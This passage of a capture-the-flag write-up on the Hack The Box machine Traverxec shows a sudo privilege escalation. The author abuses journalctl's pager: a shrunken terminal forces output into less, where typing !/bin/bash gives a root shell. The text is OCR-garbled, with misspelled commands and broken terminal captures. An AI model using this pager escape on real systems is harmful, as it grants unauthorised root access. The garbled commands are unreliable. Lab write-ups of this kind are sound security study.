![](Maszyny/Linux/Traverxec/Pasted%20image%2020210802205354.png)

I tried to view the sudo config with sudo -1 , but it requires david's password.
Exploiting journalctrl
I'll look up journalctrl on gtfobins, and there is a sudo option. It's quite short, simply saying:
| sudo journalett !/bin/sh
The trick here is that journalctrl will output to stdout if it can fit onto the current page, but into
less if it can't. Since I'm running it with -n 5, that means only five lines come out, so I need to
shrink my terminal to smaller than 5 lines, and I'll get sent into less still as root.
I'll start with a small terminal, and run the command as I can as root:
root@kali:-/hackthebox/traverxec-10.10.10.165
File Edit View Search Terminal Help
david@traverxec:-/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
[25] 0:bash 1:bash 2:bash 3:bash 4:ssh 5:nc 6:ssh-Z
"kali" 14:51 22-Nov-19
When I hit enter, I'm in less (viewing lines 1-3):
root@kali:-/hackthebox/traverxec-10.10.10.165
File Edit View Search Terminal Help
-- Logs begin at Fri 2019-11-22 00:00:54 EST, end at Fri 2019-11-22 14:51:36 EST.
Nov 22 11:45:02 traverxec sudo[1931): pam_unix (sudo: auth): auth could not identify pa
Nov 22 11:45:02 traverxec sudo (1931): www-data : command not allowed ; TTY=pts/1 ; PW
Lines 1-3
[25] 0:bash 1:bash 2bash 3Abash 4:ssh5:nc 6:5sh-Z "kali" 14:51 22-Nov-19
Now I can just type !/bin/bash , and I'm at a root shell:
